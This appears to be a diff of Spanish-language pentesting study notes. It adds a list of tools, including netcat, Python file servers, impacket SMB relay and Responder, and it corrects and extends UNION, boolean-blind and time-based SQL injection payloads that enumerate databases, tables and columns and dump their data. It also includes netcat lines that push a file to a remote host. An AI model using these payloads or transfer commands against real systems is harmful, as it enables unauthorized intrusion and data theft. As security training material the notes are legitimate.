@@ -1,19 +1,42 @@
+Herramientas generales:
+    -Burpsuite:
+        -Proxy: Herramienta necesaria para interceptar peticiones HTTP/HTTPS.
+        -Repeater: Herramienta utilizada para modificar y manipular una petición.
+        -Intruder: Herramienta utilizada para realizar ataques de fuerza bruta/reemplazo de valores.
+    -Netcat:
+        -Herrmienta liviana para establecer conexiones via TCP/UDP.
+            -Establecer una conexión hacia un puerto remoto: nc 1.1.1.1 443 -vvv
+            -Recepcionar una conexión desde un host remoto: nc -lvp 443
+            -Enviar datos a través de netcat: nc 1.1.1.1 443 < dato.txt
+            -Recibir datos a través de netcat: nc -lvp 443 > dato.txt
+    -Python3:
+        -Lenguaje de programación interpretado de gran versatilidad.
+            -Desplegar un servidor web: python3 -m http.server 80
+            -Desplegar un servidor ftp: python3 -m pyftpdlib 21
+        -Paqueteria impacket:
+            -Desplegar un servidor smb: impacket-smbserver remoteShare localShare
+            -Desplegar un relay smb: impacket-smbrelayx
+        -Responder: Herramienta utilizada para el envenenamiento de peticiones para multiples protocolos, entre ellos HTTP,DNS,SMB,FTP.
+
+
 Pentest de aplicaciones WEB.
     -SQLi
         -Error based SQLi: Inyección basada en romper la estructura de la query para visualizar el error, entender la consulta y alterar la misma.
         Posibles payloads a probar: ' ) - ( , . ; : { } 
             -Enumeración de cantidad de columnas: union select 1,2,3,4... (Hasta que el error desaparezca)
             -Enumeración de base de datos utilizando la función "database()": union select 1,2,database();
-            -Enumeración de tablas utilizando la base de datos "information": union select 1,2,group_concat(table_name) from information.schema.tables where        table_schema = "Nombre de la BD";
-            -Enumeración de columnas utilizando la base de datos "information": union select 1,2,group_concat(column_name) from information.schema.columns where table_name = "Nombre de la tabla"'
+            -Enumeración de tablas utilizando la base de datos "information": union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = "Nombre de la BD";
+            -Enumeración de columnas utilizando la base de datos "information": union select 1,2,group_concat(column_name) from information_schema.columns where table_name = "Nombre de la tabla"'
             -Desplegar información de la tabla: union select 1,2,group_concat(columna1, ":", columna2 SEPARATOR '<br>') from TABLA01;
          -Time boolean SQLi: Inyección basada en la respuesta el boolean de respuesta".
             -Enumeración de base de datos utilizando "like" letra a letra (script): union select 1,2,3 where database() like '%a';-- 
-            -Enumeración de tablas utilizando "like" letra a letra (script): union select 1,2,3 from information.schema.tables where table_schema = 'DB' and table_name like 'a%';--
-            -Enumeración de columnas utilizando "like" letra a letra (script): union select 1,2,3 from information.schema.columns where table_schema = 'DB' and table_name = 'tabla01' and column_name like '%a' and column_name != 'id';--
+            -Enumeración de tablas utilizando "like" letra a letra (script): union select 1,2,3 from information_schema.tables where table_schema = 'DB' and table_name like 'a%';--
+            -Enumeración de columnas utilizando "like" letra a letra (script): union select 1,2,3 from information_schema.columns where table_schema = 'DB' and table_name = 'tabla01' and column_name like '%a' and column_name != 'id';--
          -Time based SQLi: Inyección basada en pausas cuando el condicional es "true".
-            -Enumeración de base de datos utilizando "like" y "sleep()"(script): union select 1,sleep() and database() like 'd%';--
-            
+            -Enumeración de base de datos utilizando "like" y "sleep()"(script): union select 1,sleep(1) and database() like 'd%';--
+            -Enumeración de tablas utilizando "like" letra a letra (script): union select 1,sleep(1) from information_schema.tables where table_schema = 'DB' and table_name like 'a%';--
+            -Enumeración de columnas utilizando "like" letra a letra (scriptt): union select 1,sleep(1) from information_schema.columns where table_schema = 'DB' and table_name = 'tabla01' and column_name like '%a';--
+          
     -XSS
     -XXE
     -SSRF
